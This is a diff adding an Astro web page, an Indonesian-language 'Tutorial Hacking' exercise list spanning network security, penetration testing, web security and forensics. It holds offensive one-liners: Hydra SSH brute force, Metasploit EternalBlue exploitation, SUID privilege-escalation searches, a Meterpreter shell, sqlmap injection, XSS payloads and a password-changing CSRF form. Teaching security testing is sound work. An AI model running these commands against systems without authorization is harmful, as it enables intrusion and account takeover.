@@ -1,0 +1,167 @@
+---
+import BaseLayout from "../layouts/BaseLayout.astro";
+
+const topics = [
+  {
+    id: "network",
+    title: "Network Security",
+    icon: "🔒",
+    desc: "Keamanan jaringan dan teknik penetration testing.",
+    latihan: [
+      {
+        soal: "Scan jaringan dengan Nmap.",
+        contoh: `nmap -sV -sC 192.168.1.0/24\n\n# Output: daftar host, port terbuka, dan service`,
+      },
+      {
+        soal: "Deteksi kerentanan dengan Nessus.",
+        contoh: `1. Install Nessus\n2. Buat scan policy baru\n3. Masukkan IP target\n4. Jalankan scan dan analisis hasil`,
+      },
+      {
+        soal: "Analisis packet dengan Wireshark.",
+        contoh: `1. Buka Wireshark\n2. Pilih interface jaringan\n3. Capture packet\n4. Analisis protocol dan payload`,
+      },
+      {
+        soal: "Brute force SSH dengan Hydra.",
+        contoh: `hydra -l admin -P wordlist.txt ssh://192.168.1.1`,
+      },
+      {
+        soal: "Deteksi intrusi dengan Snort.",
+        contoh: `snort -c /etc/snort/snort.conf -i eth0 -A console`,
+      },
+    ],
+  },
+  {
+    id: "pentest",
+    title: "Penetration Testing",
+    icon: "🎯",
+    desc: "Metodologi penetration testing dan tools.",
+    latihan: [
+      {
+        soal: "Reconnaissance dengan theHarvester.",
+        contoh: `theHarvester -d example.com -b google`,
+      },
+      {
+        soal: "Scan port dan service dengan Nmap.",
+        contoh: `nmap -sS -sV -O -A 192.168.1.1`,
+      },
+      {
+        soal: "Exploit dengan Metasploit.",
+        contoh: `msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.1\nexploit`,
+      },
+      {
+        soal: "Privilege escalation di Linux.",
+        contoh: `sudo -l\nfind / -perm -4000 2>/dev/null\n# Cari SUID binary yang bisa dieksploitasi`,
+      },
+      {
+        soal: "Post-exploitation dengan Meterpreter.",
+        contoh: `meterpreter > sysinfo\nmeterpreter > getuid\nmeterpreter > shell`,
+      },
+    ],
+  },
+  {
+    id: "web",
+    title: "Web Security",
+    icon: "🌐",
+    desc: "Keamanan web application: SQL injection, XSS, CSRF.",
+    latihan: [
+      {
+        soal: "SQL Injection dengan sqlmap.",
+        contoh: `sqlmap -u "http://example.com/page?id=1" --dbs`,
+      },
+      {
+        soal: "XSS (Cross-Site Scripting) testing.",
+        contoh: `<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>`,
+      },
+      {
+        soal: "CSRF (Cross-Site Request Forgery) testing.",
+        contoh: `<form action="http://example.com/change-password" method="POST">\n    <input type="hidden" name="password" value="hacked">\n</form>`,
+      },
+      {
+        soal: "Directory scanning dengan Gobuster.",
+        contoh: `gobuster dir -u http://example.com -w wordlist.txt`,
+      },
+      {
+        soal: "SSL/TLS scanning dengan SSLyze.",
+        contoh: `sslyze --regular example.com`,
+      },
+    ],
+  },
+  {
+    id: "forensics",
+    title: "Forensics",
+    icon: "🔍",
+    desc: "Digital forensics dan analisis malware.",
+    latihan: [
+      {
+        soal: "Analisis file dengan ExifTool.",
+        contoh: `exifTool suspicious.jpg`,
+      },
+      {
+        soal: "Analisis network capture dengan Wireshark.",
+        contoh: `1. Buka file .pcap di Wireshark\n2. Follow TCP Stream\n3. Analisis protocol dan payload`,
+      },
+      {
+        soal: "Analisis malware dengan VirusTotal.",
+        contoh: `1. Upload file ke virustotal.com\n2. Analisis hasil scan\n3. Cek behavior dan signature`,
+      },
+      {
+        soal: "File recovery dengan PhotoRec.",
+        contoh: `photorec /dev/sda1`,
+      },
+      {
+        soal: "Memory analysis dengan Volatility.",
+        contoh: `volatility -f memory.dmp imageinfo\nvolatility -f memory.dmp pslist`,
+      },
+    ],
+  },
+];
+---
+
+<BaseLayout title="Tutorial Hacking - Choirul Haq">
+  <section class="py-20 px-4 bg-gradient-to-br from-purple-50 to-sky-50">
+    <div class="max-w-4xl mx-auto">
+      <h1 class="text-4xl md:text-5xl font-bold text-center mb-4 text-purple-900">
+        🔐 Tutorial Hacking
+      </h1>
+      <p class="text-center text-gray-600 mb-12 text-lg">
+        Belajar ethical hacking dan keamanan siber.
+      </p>
+
+      <div class="space-y-12">
+        {
+          topics.map((topic) => (
+            <div id={topic.id} class="bg-white rounded-xl shadow-lg p-8">
+              <div class="flex items-center gap-4 mb-4">
+                <span class="text-4xl">{topic.icon}</span>
+                <div>
+                  <h2 class="text-2xl font-bold text-purple-800">{topic.title}</h2>
+                  <p class="text-gray-600">{topic.desc}</p>
+                </div>
+              </div>
+
+              <div class="space-y-6">
+                {topic.latihan.map((lat, i) => (
+                  <div class="bg-purple-50 rounded-lg p-4">
+                    <h3 class="font-semibold text-purple-900 mb-2">
+                      Latihan {i + 1}: {lat.soal}
+                    </h3>
+                    <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto text-sm"><code>{lat.contoh}</code></pre>
+                  </div>
+                ))}
+              </div>
+            </div>
+          ))
+        }
+      </div>
+
+      <div class="mt-12 text-center">
+        <a
+          href="/"
+          class="inline-block bg-purple-700 text-white px-8 py-3 rounded-lg font-semibold hover:bg-purple-800 transition"
+        >
+          ← Kembali ke Profil
+        </a>
+      </div>
+    </div>
+  </section>
+</BaseLayout>
